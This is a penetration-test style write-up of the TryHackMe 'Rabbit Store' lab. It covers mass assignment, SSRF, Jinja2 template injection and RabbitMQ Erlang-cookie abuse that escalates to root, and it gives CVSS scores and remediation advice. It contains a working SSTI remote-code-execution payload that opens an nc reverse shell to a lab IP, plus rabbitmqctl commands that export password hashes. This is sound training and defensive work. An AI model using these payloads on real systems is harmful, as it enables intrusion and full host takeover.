# Penetration Test Report    
**Engagement:** TryHackMe - Rabbit Store   
**Date:** October 2025  
**Tester:** Colin S       

---

## Summary 
The engagement focused on the TryHackMe Rabbit Store. During the test, three key web vulnerabilities were exploited to gain initial access: a Mass Assignment Vulnerability, Server-Side Request Forgery, and Server-Side Template Injection. Following initial access, the RabbitMQ service was enumerated to retrieve credentials and good root level access.  

Remediation recommendations include securing web application endpoints against Mass Assignment, Server-Side Request Forgery, and server-Side Template Injection vulnerabilities, by implementing strict input validation. Hardening of the RabbitMQ service is also recommended to prevent sensitive information being exposed.
 
## Vulnerabilities  

### 1. Mass Assignment Vulnerability  
**CVSS v4.0 Base Score:** 6.9 (Medium)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N  

**CVSS Justification:**  
An unauthenticated attacker could manipulate JSON parameters during registration to set sensitive attributes. The exploit is network-accessible, low complexity, no privileges or user interaction required. The results are low impact within the application context, due to only one parameter being available for manipulation.  

**Summary:**   
When registering as a new user on the website, it was discovered that the JSON parameters could be modified and submitted for successful registration. This then allowed the user to log in and access the restricted subscription-only portion of the website. This allows attackers to gain access to hidden functionality or information only intended for paying clients, attackers could publicly leak this information.   

**Background:**   
The `/api/register` endpoint accepted client-controlled fields that should have been controlled server-side. By supplying `"subscription":"active"` during the registration process the server returned a valid JWT with `"subscription":"active"`, enabling access to restricted functionality. This is classed as a mass assignment vulnerability issue where server-side enforcement of assignable fields is missing.  


**Technical details & Evidence:**   
HTTP requests were intercepted and modified using Caido as follows.    

Via a web browser, a registration request was submitted to `http://storage.cloudsite.thm/api/register` this request was intercepted via Caido and the value below added to the body.  
```JSON
"subscription":"active"
```  
![MAV - active register request.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/MAV%20-%20active%20register%20request.png)  
 
This modified request was then forwarded onto the server which responded with a new JWT token and a response indicating `active` status in the body.  
![MAV - active register response.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/MAV%20-%20active%20register%20response.png)  

JWT token decoded shows the value `"subscription":"active"`  
![MAV - JWT.IO - active.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/MAV%20-%20JWT.IO%20-%20active.png)  

When logging in as the newly registered user access to the subscription-only dashboard was enabled.  
![MAV - active dashboard.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/MAV%20-%20active%20dashboard.png)

**Impact:**   
Unauthorised elevation of account privileges enabling access to restricted subscription-only content can cause significant financial and reputational damage to the organisation. Attackers may leak subscription-only content online or potentially undertake mapping of internal services and prepare further attacks. 

**Remediation Advice:**   
Enforce an allow-list of assignable fields server-side. Validate and normalise inputs and ensure default account attributes are set server-side only, do not accept client-controlled values for authorisation-sensitive attributes. Perform a detailed review of all API endpoints to ensure only intended fields can be modified by clients.   

---

### 2. Server-Side Request Forgery  
**CVSS v4.0 Base Score:** 5.3 (Medium)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N  

**CVSS Justification:**  
The "Upload From URL" feature allowed the server to fetch arbitrary URLs, including `localhost` on the same host. Attack complexity is low and the issue requires prior authenticated access to the subscription-only dashboard. Exploitation disclosed limited internal resources. As such a lower-than-expected CVSS v4.0 score was modelled, in practice Server-Side Request Forgery is a high-risk vulnerability, and remediation should be prioritised.  

**Summary:**  
The "Upload From URL" internal functionality does not have sufficient filtering implemented. This allows fetching of documents on the local host by pointing the feature at `http://localhost:3000/api/docs`. The API `/api/docs` file then became accessible via the provided upload link, enabling attackers to retrieve hidden internal data. This behaviour is representative of SSRF (see OWASP Server-Side Request Forgery in appendices).  

**Background:**   
During initial enumeration it was discovered the host was running on Express (default port `3000`). When pointing the "Upload From URL" functionality at `http://localhost:3000/api/docs` the response confirmed that this document had been successfully uploaded, and the user was given a new URL to access this file. This is a textbook example of SSRF attacks against a host server; this can also enable further access to restricted resources as when a URL is supplied to this feature it appears to originate from a trusted location. Due to a lack of adequate input filtering the user was able to access internal documentation in the way of the `/api/docs` file and read its contents. 

**Technical details & Evidence:**   
HTTP requests when attempting to use the "Upload From URL" functionality were intercepted and modified using Caido as follows.  

The initial request is intercepted and the URL adjusted as below.
```JSON
{"url":"http://localhost:3000/api/docs"}
```
![SSRF - localhost request.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSRF%20-%20localhost%20request.png)  

The server then responded with 
```JSON
{
  "message":"File stored from URL successfully",
  "path":"/api/uploads/fe6f5631-316f-4877-ad1f-71f0a8395c4a"
}
```
![SSRF - localhost response.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSRF%20-%20localhost%20response.png)

When accessing the provided file location `http://storage.cloudsite.thm/api/uploads/fe6f5631-316f-4877-ad1f-71f0a8395c4a` the contents of the internal `/api/docs` file could be read.    
![SSRF - api docs success.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSRF%20-%20api%20docs%20success.png)

**Impact:**   
A successful SSRF can lead to unauthorised access to internal resources. In this instance, internal API endpoints and data were disclosed. If SSRF is used to connect to external third-party systems, it may facilitate malicious actions that appear to originate from the vulnerable organisation.  

**Remediation Advice:**  
Implement strict input validation and allow-list server-side URL fetches. Block requests to private IP ranges and link-local addresses (for example: `127.0.0.0/8`). Require authentication and authorization for internal endpoints. Add server-side logging for fetch requests with alerting enabled for anomalous or suspicious fetches. See the SSRF guidance in the appendices for further details.  

---

### 3. Server-Side Template Injection  
**CVSS v4.0 Base Score:** 8.7 (High)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N  

**CVSS Justification:**    
User input passed to the Jinja2 template led to remote code execution. The attack was network-accessible, low complexity, and required prior authenticated access to the subscription-only dashboard. This resulted in high confidentiality, integrity and availability impact.  

**Summary:**   
The `/api/fetch_messages_from_chatbot` POST endpoint, which is still under development, reflected user-supplied inputs into the template. A crafted payload could be supplied and executed to run system commands; this successfully allowed access to the target machine as a low-privilege user.  

**Background:**   
Template rendering logic included unsanitised user inputs. When supplying a user input to the `/api/fetch_messages_from_chatbot` endpoint via a HTTP POST request the output was reflected into the Jinja2 template. Using a sequence of special characters commonly used in template expressions, such as `${{<%[%'\"}}%\\` an exception was raised in the server response, revealing the template engine in use and confirming the presence of a template-injection vulnerability. A specially crafted message was then sent to the endpoint to initiate a reverse shell connection which was executed successfully and provided shell access to the target as the user `azrael`.  

**Technical details & Evidence:**  
The following details the steps taken to confirm the POST request format to the `/api/fetch_messages_from_chatbot` endpoint, determine the template engine in use and gain shell access.  

A POST request with an empty body was sent.  
![SSTI - blank test.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20blank%20test.png)  
The server responded with HTTP `200`, confirming the endpoint's availability and the request format. This also provided a helpful error message as to the minimum required parameter needed in the request body. 

Next another request was sent with the username included in the body.  
```JSON
{
 "username":"test"
}
```
![SSTI - test username.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20username%20test.png)  
In the response from the server the username provided of `test` is reflected in the message.  

The next stage is now to generate an exception in the server response by using a polyglot. Various combinations were executed, but the one which was successful was `${{<%[%'\"}}%\\` which is a common polyglot used to identify template engines. 
```JSON
{
 "username":"${{<%[%'\"}}%\\"
}
```
![SSTI - polyglot.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20polyglot.png)  
The server response this time provided details of the template engine in use and raised an exception which strongly indicates it is vulnerable to Server-Side Template Injection. Research points to public proofs-of-concept demonstrating remote code execution in vulnerable Jinja2 instances. 

First, a payload was sent in the POST request to validate remote code execution and output the `id` command.  
```JSON
{
 "username":"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}"
}
```
![SSTI - Id test.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20ID%20test.png)  
The server’s response confirmed command execution was possible, and the output indicated commands were being executed as the `azrael` user.  

Now the payload was modified to attempt to gain reverse shell access to the target system.
```JSON
{
 "username":"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__(\"os\").popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.4.12.97 9001 >/tmp/f\").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}"
}
```
Prior to sending this request to the server, a listener was set up on the attacking machine.
```bash
nc -lnvp 9001
```
![SSTI - reverse shell payload.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20reverse%20shell%20payload.png)  
This did not generate an HTTP response body; however, a reverse shell was received on the listener as the `azrael` user.   
![SSTI - shell.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/SSTI%20-%20shell.png)

**Impact:**   
Full remote code execution on the application host, enabling arbitrary command execution and access to sensitive data. Attackers can leverage this initial access, even if only as a low-privilege user, to pivot to other hosts on the network or escalate privileges on the target system, leading to further damage.  

**Remediation Advice:**   
Where possible, do not allow users to create or modify templates. If template submission is required by business needs, validate and sanitise all inputs strictly. Execute any user-submitted templates or code in a sandboxed environment that restricts access to dangerous modules and functions.  

---

### 4. Privilege Escalation via RabbitMQ  
**CVSS v4.0 Base Score:** 9.3 (Critical)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:H/SA:N  

**CVSS Justification:**  
By retrieving the Erlang cookie (accessible to a low-privileged account), it was possible to export RabbitMQ definitions containing the root user’s password hash. Once the hash was decoded, full root access was gained to the target system reflecting the critical CVSS score attributed to this discovery.  

**Summary:**  
Post-compromise enumeration of the target system located the erlang cookie which is required to perform authenticated actions on connected nodes. In this instance this allowed the extraction of data from the RabbitMQ node, this included the root user’s password hash. When successfully decoded this hash was used to gain full root privilege on the target system.  

**Background:**  
When enumerating the target system, it was discovered that the `.erlang.cookie` was present and accessible to our user at `/var/lib/rabbitmq/.erlang.cookie`. RabbitMQ/Erlang distribution authentication relies on `.erlang.cookie`. This allowed the use of the RabbitMQ command line tool from the attacking machine to authenticate to the RabbitMQ node and perform data extraction. The `root` user's hash was extracted and then used to gain full root access to the target system.  

**Technical details & Evidence:** 
During initial enumeration it was found that the Erlang Port Mapper Daemon (epmd) and a RabbitMQ node were present on the target system. As such, initial recon of the target host by a low-privileged user included searching for the `.erlang.cookie` via the following command:  
```bash
azrael@forge:/$ find / -type f -name ".erlang.cookie" 2>/dev/null
/var/lib/rabbitmq/.erlang.cookie
azrael@forge:/$ cat /var/lib/rabbitmq/.erlang.cookie
[REDACTED]
```
The cookie was located in `/var/lib/rabbitmq/` directory and was accessible to the `azrael` user.

This cookie was then used with the `rabbitmqctl` tool from the attacking machine to perform authenticated actions on the RabbitMQ instance which was located at `rabbit@forge`. 

First the status of the node was confirmed.
```bash
sudo rabbitmqctl --erlang-cookie '[REDACTED]' --node rabbit@forge status
```
![Flag2 - rabbitmqctl status.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/Flag2%20-%20rabbitmqctl%20status.png)    

User enumeration was then performed.  
```bash
sudo rabbitmqctl --erlang-cookie '[REDACTED]' --node rabbit@forge list_users
```
![Flag2 - rabbitmqctl users.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/Flag2%20-%20rabbitmqctl%20users.png)  
This provided the details of one user the `root` user. Next the user definitions were extracted which contain detailed information about each user, including their password hash.  
```bash
sudo rabbitmqctl --erlang-cookie '[REDACTED]' --node rabbit@forge export_definitions /tmp/rabbit_defs.json
```
![Flag2 - rabbitmqctl get defs.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/Flag2%20-%20rabbitmqctl%20get%20defs.png)  

Once the definitions had been extracted, these could be output as below to obtain the `root` user’s password hash value. 
```bash
jq -c '.users[] | select(.name=="root")' /tmp/rabbit_defs.json
```
```JSON
{"hashing_algorithm":"rabbit_password_hashing_sha256",
"limits":{},
"name":"root",
"password_hash":"[REDACTED]",
"tags":["administrator"]}
```
When the user list was output, there was a comment listed along with the root user's. This indicated that the password hash of the `root` user could be used as their login password. Upon reviewing RabbitMQ password details it was found that the hash includes a 32-bit salt which is prepended to the password prior to SHA-256 hashing, and the result is base64-encoded.  

The hash can be extracted via the following command:
```bash
echo -n "[REDACTED]" | base64 -d | xxd -p -c 100
[REDACTED]
```
The output still contains the 32-bit salt which when removed leaves only the password hash. This value was then used to gain `root` access to the target system.
```bash
azrael@forge:/$ su root                                                         
Password:                                                                    
root@forge:/# id                                                        
uid=0(root) gid=0(root) groups=0(root)
```

**Impact:**    
Full compromise of target system as the root user with the highest level of privilege possible. Attackers can pivot to other hosts, establish persistence for long-term access, or conduct further intrusions and monitoring.   

**Remediation Advice:**  
Harden RabbitMQ: restrict epmd/rabbit ports to internal management networks, ensure `.erlang.cookie` ownership and permissions prevent reading by non-privileged users. Also restrict network exposure of epmd (port `4369`) and RabbitMQ distribution/management ports, rotate cookies and credentials, and log and monitor export operations.  

---
## Appendices  
[OWASP Top 10](https://owasp.org/www-project-top-ten/)  
[Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)  
[CVSS 4.0](https://www.first.org/cvss/calculator/4-0)  
[Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)  
[RabbitMQ Passwords](https://www.rabbitmq.com/docs/passwords)
